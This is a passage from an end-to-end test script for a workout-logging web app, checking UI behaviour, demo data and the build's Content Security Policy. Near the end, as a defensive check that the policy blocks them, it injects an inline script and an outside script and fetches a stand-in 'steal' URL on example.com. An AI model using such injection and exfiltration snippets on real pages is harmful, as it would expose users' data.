    const mp = await ev(() => { const L = window.__ironlog; L.state.settings.bands = JSON.parse(JSON.stringify(L.BANDS));
      const out = []; for (let k = 1; k <= 4; k++) { const d = new Date(2026, 9, 3 - 7 * k - 4).toISOString().slice(0, 10); out.push({ id: 'm' + k, date: d, dayIdx: 0, dayId: null, dayName: 'A', routineId: '', free: true, notes: '', ex: [{ exId: 'bench', sets: Array.from({ length: 12 }, () => ({ w: 80, r: 8, rir: 2, warm: false })) }] }); }
      L.state.sessions = out; L.invalidate(); L.ui.tab = 'today'; L.ui.mapSrc = 'avg'; L.ui.folds['today:map'] = true; L.render();
      const card = document.querySelector('#view > [data-mkey="map"]'); const leg = card.querySelector('.bm-legend').innerText.replace(/\s+/g, ' ');
      const lats = [...card.querySelector('.mm[data-m="lats"]').classList].find(c => c.startsWith('st-')); const sub = card.querySelector('.sec-s').innerText;
      const n = +(leg.match(/Below target (\d+)/) || [])[1]; const m = +(sub.match(/(\d+) below/) || [])[1];
      return { leg, lats, sub, n, m }; });
    ok(mp.lats === 'st-under' && mp.n > 0 && mp.n === mp.m && /on average/.test(mp.sub), '13. untrained lats on an average are amber, and the legend and the summary count the same below', mp);
    // 4. Volume rows: no sets is none whatever the target, on the week; amber on an average with a minimum.
    const vr = await ev(() => { const L = window.__ironlog; L.ui.tab = 'dash'; L.ui.folds['dash:volume'] = true;
      L.ui.volMode = 'avg'; L.render(); const row = n => { const r = [...document.querySelectorAll('#view [data-mkey="volume"] .mrow')].find(x => x.innerText.startsWith(n)); return r ? r.querySelector('.plate').className : null; };
      const avgLats = row('Lats');
      L.state.sessions.push({ id: 'thisweek', date: '2026-09-29', dayIdx: 0, dayId: null, dayName: 'A', routineId: '', free: true, notes: '', ex: [{ exId: 'bench', sets: [{ w: 80, r: 8, rir: 2, warm: false }] }] }); L.invalidate();
      L.ui.volMode = 'week'; L.render(); const wkLats = row('Lats');
      L.state.settings.bands.traps = [0, 16]; L.ui.volMode = 'avg'; L.render(); const avgTraps = row('Traps');
      return { avgLats, wkLats, avgTraps }; });
    ok(/yellow/.test(vr.avgLats) && /none/.test(vr.wkLats) && /none/.test(vr.avgTraps), '4. volume rows: untrained with a minimum is amber on the average, grey this week, and grey with a minimum of 0', vr);
    // 11. Choosing Barbell as the plate helper shows Bar for this lift at once.
    const ed = await ev(async () => { const L = window.__ironlog; L.ACT.exEdit({ dataset: { ex: 'cableRow' } }); document.querySelectorAll('#modal details').forEach(d => d.open = true);
      const before = !!document.querySelector('[data-ebind="barRaw"]'); const sel = document.querySelector('[data-ebind="plates"]'); sel.value = 'bar'; sel.dispatchEvent(new Event('change', { bubbles: true }));
      await new Promise(r => setTimeout(r, 50)); document.querySelectorAll('#modal details').forEach(d => d.open = true); const after = !!document.querySelector('[data-ebind="barRaw"]');
      sel.value; const s2 = document.querySelector('[data-ebind="plates"]'); s2.value = 'auto'; s2.dispatchEvent(new Event('change', { bubbles: true })); await new Promise(r => setTimeout(r, 50));
      return { before, after, gone: !document.querySelector('[data-ebind="barRaw"]'), plates: L.ui.modal.e.plates }; });
    ok(!ed.before && ed.after && ed.gone && ed.plates === undefined, '11. the editor shows Bar for this lift as soon as Barbell is chosen, and hides it again on Automatic', ed);
    await ev(() => window.__ironlog.ACT.mClose());
    // 7. A stall on a lift with no estimate (high reps) can make its muscle lagging.
    const lg = await ev(() => { const L = window.__ironlog;
      const days = [-41, -35, -28, -21, -14, -7, -1].map(k => new Date(2026, 9, 3 + k).toISOString().slice(0, 10));
      const S = (id, d, ex, w, r) => ({ id, date: d, dayIdx: 0, dayId: null, dayName: 'A', routineId: '', free: true, notes: '', ex: [{ exId: ex, sets: [{ w, r, rir: 1, warm: false }] }] });
      // Abs: cable crunch creeping up (not stalled, not moving), hanging leg raise (no estimate) stuck at 12.
      L.state.sessions = days.flatMap((d, i) => [S('c' + i, d, 'bench', 80 + i * 2.5, 8), S('l' + i, d, 'latPulldown', 60 + i * 2.5, 10), S('q' + i, d, 'hackSquat', 100 + i * 2.5, 8), S('k' + i, d, 'cableCrunch', 50 + i * 0.2, 10), S('h' + i, d, 'hangingLegRaise', 0, 12)]);
      L.invalidate(); const I = L.IDX(); return { hlr: I.exStats.hangingLegRaise.stalled, crunch: I.exStats.cableCrunch.stalled, abs: (I.scores.find(s => s.m === 'abs') || {}).label }; });
    ok(lg.hlr && !lg.crunch && lg.abs === 'lagging', '7. a stall on a lift with no estimate (hanging leg raise) counts toward its muscle', lg);
    // 14. Log a workout now on the starter says the targets changed.
    ok(!P.errors.length, 'no page errors (review fixes)', P.errors);
    await P.browser.close();
  }
  {
    const P = await open('index.html', { touch: true, clock: '2026-10-03T11:30:00', realStarter: true });
    const { page } = P; const ev = (f, a) => page.evaluate(f, a);
    await ev(() => window.__ironlog.ACT.obFree()); await wait(150);
    const t = await ev(() => document.getElementById('toast').innerText);
    ok(/Upper \/ lower, 4 days, and weekly targets match it/.test(t), '14. Log a workout now on the starter says the routine and that targets match it', t);
    await P.browser.close();
  }
  // 2 and 3. The demo across 21 dates on the six-day routine (where the reviewer found a stall), lb and kg: no stall, nothing under its bar.
  {
    const bad = [];
    for (const unit of ['lb', 'kg']) for (let d = 0; d < 21; d++) {
      const day = new Date(Date.UTC(2026, 9, 1 + d)).toISOString().slice(0, 10);
      const P = await open('index.html', { clock: day + 'T11:30:00', realStarter: true });
      const r = await P.page.evaluate((unit) => { const L = window.__ironlog; const out = []; L.state.settings.unit = unit; const r = L.routineFromTemplate('onemuscle'); L.state.routines = [r]; L.state.activeRoutineId = r.id; L.makeDemo(); L.invalidate();
        const st = L.stalledIds(); if (st.length) out.push('stalled ' + st.join('/'));
        const seen = new Set(); for (const s of L.state.sessions) for (const b of s.ex) { if (seen.has(b.exId)) continue; seen.add(b.exId); const e = L.state.exercises.find(x => x.id === b.exId); if (e.equip === 'barbell' && !e.bw && /below the/.test(L.plateText(b.sets[0].w, 'bar', e))) out.push(b.exId + ' under the bar'); }
        return out; }, unit);
      if (r.length) bad.push(unit + ' ' + day + ' ' + r.join(', '));
      await P.browser.close();
    }
    ok(!bad.length, '2 and 3. the six-day demo has no stall and no load under its bar, on any of 21 dates, lb and kg', bad.slice(0, 5));
  }

  // ---- The Content Security Policy in the installed build.
  {
    const ROOT = path.join(__dirname, '..'); const DIST = path.join(ROOT, 'dist');
    execFileSync('node', [path.join(ROOT, 'scripts', 'build.js')], { stdio: 'ignore' });
    const html = fs.readFileSync(path.join(DIST, 'index.html'), 'utf8');
    const meta = (html.match(/<meta http-equiv="Content-Security-Policy" content="([^"]+)">/) || [])[1] || '';
    const crypto = require('crypto');
    const inline = [...html.matchAll(/<script>([\s\S]*?)<\/script>/g)].map(m => `'sha256-${crypto.createHash('sha256').update(m[1], 'utf8').digest('base64')}'`);
    ok(meta && inline.length >= 3 && inline.every(h => meta.includes(h)), 'the build carries a policy that allows each of its inline scripts by hash', { n: inline.length });
    ok(/script-src 'self' 'sha256-/.test(meta) && !/unsafe-inline[^;]*;\s*style/.test(meta.split('style-src')[0]) && !/unsafe-eval/.test(meta) && /object-src 'none'/.test(meta) && /base-uri 'none'/.test(meta) && !/cdnjs|jsdelivr|unpkg/.test(meta), 'scripts only from this site and those hashes: no unsafe-inline or eval for scripts, no CDNs, no plugins, no base tag', meta.slice(0, 160));
    ok(/connect-src 'self' https:\/\/[a-z0-9]+\.supabase\.co wss:\/\/[a-z0-9]+\.supabase\.co https:\/\/api\.pwnedpasswords\.com;/.test(meta), 'data can go only to this site, the Supabase project, and the breach check', meta.match(/connect-src[^;]+/));
    ok(html.indexOf('Content-Security-Policy') < html.indexOf('<script'), 'the policy comes before the first script, so it covers every one');
    const prev = (() => { execFileSync('node', [path.join(ROOT, 'scripts', 'build.js'), '--preview'], { stdio: 'ignore' }); return fs.readFileSync(path.join(ROOT, 'dist-preview', 'index.html'), 'utf8'); })();
    ok(/Content-Security-Policy/.test(prev), 'the preview build has it too');
    // The look-ahead scanner can read the app's script as markup now and then;
    // an image tag written in it was fetched as "${m.shot}" (a stray 404).
    ok(!/<(img|source|video|audio|iframe)\b/i.test(fs.readFileSync(path.join(ROOT, 'index.html'), 'utf8').split('<script>')[1] || ''), 'no media tag written literally in the app\'s script (\\x3cimg instead), so nothing is fetched from a template');
    const TYPES = { '.html': 'text/html', '.js': 'text/javascript', '.css': 'text/css', '.woff2': 'font/woff2', '.png': 'image/png', '.webmanifest': 'application/manifest+json' };
    const server = http.createServer((req, res) => { let p = decodeURIComponent(req.url.split('?')[0]); if (p.endsWith('/')) p += 'index.html'; const f = path.join(DIST, p.replace(/^\/ironlog\//, '/')); if (!f.startsWith(DIST) || !fs.existsSync(f)) { res.writeHead(404); res.end('nf'); return; } res.writeHead(200, { 'Content-Type': TYPES[path.extname(f)] || 'application/octet-stream' }); fs.createReadStream(f).pipe(res); });
    await new Promise(r => server.listen(0, '127.0.0.1', r));
    const base = `http://127.0.0.1:${server.address().port}/ironlog/`;
    const browser = await chromium.launch();
    const ctx = await browser.newContext({ viewport: { width: 390, height: 844 }, hasTouch: true, isMobile: true });
    await ctx.addInitScript(() => { window.__cspv = []; document.addEventListener('securitypolicyviolation', e => window.__cspv.push(e.violatedDirective + ' ' + e.blockedURI)); });
    const page = await ctx.newPage(); const errors = []; page.on('pageerror', e => errors.push(e.message)); page.on('console', m => { if (m.type() === 'error') errors.push(m.text()); });
    page.on('response', r => { if (r.status() >= 400) errors.push('HTTP ' + r.status() + ' ' + r.url()); });
    await page.goto(base); await page.waitForFunction(() => window.__ironlog && window.__libs && window.__libs.chart && window.__libs.sortable, null, { timeout: 15000 });
    // Use it: demo data, the 3D body (a module import), Stats charts, a session, a backup.
    await page.evaluate(() => { const L = window.__ironlog; L.state.settings.onboarded = true; L.makeDemo(); L.ui.tab = 'today'; L.ui.folds['today:map'] = true; L.render(); });
    await page.evaluate(() => { const b = document.querySelector('[data-act="mapView"][data-v="3d"]'); if (b) b.click(); });
    await page.waitForFunction(() => { const s = window.__ironlog.map3d(); return s.state === 'ready' || s.state === 'fail'; }, null, { timeout: 15000 }).catch(() => {});
    const m3 = await page.evaluate(() => window.__ironlog.map3d().state);
    await page.evaluate(() => { const L = window.__ironlog; L.ui.tab = 'dash'; L.render(); });
    await wait(500);
    await page.evaluate(() => { const L = window.__ironlog; L.ui.tab = 'today'; L.render(); document.querySelector('.hero [data-act="startSession"]').click(); });
    await wait(300);
    const v1 = await page.evaluate(() => window.__cspv.slice());
    ok(m3 === 'ready' && !v1.length && !errors.length, 'the app, the 3D body, charts, and a session run with no policy violation', { m3, v1, errors: errors.slice(0, 3) });
    // What the policy is for: script slipped into the page does not run, and data cannot leave.
    const inj = await page.evaluate(async () => { const s = document.createElement('script'); s.textContent = 'window.__pwned=1'; document.head.appendChild(s); const img = new Image(); img.onerror = () => {}; let sent = true; try { await fetch('https://example.com/steal?x=1', { mode: 'no-cors' }); } catch (e) { sent = false; } const ext = document.createElement('script'); ext.src = 'https://cdn.example.com/x.js'; document.head.appendChild(ext); await new Promise(r => setTimeout(r, 300)); return { pwned: window.__pwned === 1, sent, v: window.__cspv.slice() }; });
    ok(!inj.pwned && !inj.sent && inj.v.some(x => /^script-src/.test(x)) && inj.v.some(x => /^connect-src/.test(x)), 'an injected inline script does not run, an outside script does not load, and a fetch to another site is refused', inj);
    await browser.close(); server.close();
  }

  console.log(fails.length ? `FAILURES ${fails.length}` : 'ALL PASS');
  process.exit(fails.length ? 1 : 0);
})().catch(e => { console.log('FAIL crash', e && e.stack || e); process.exit(1); });
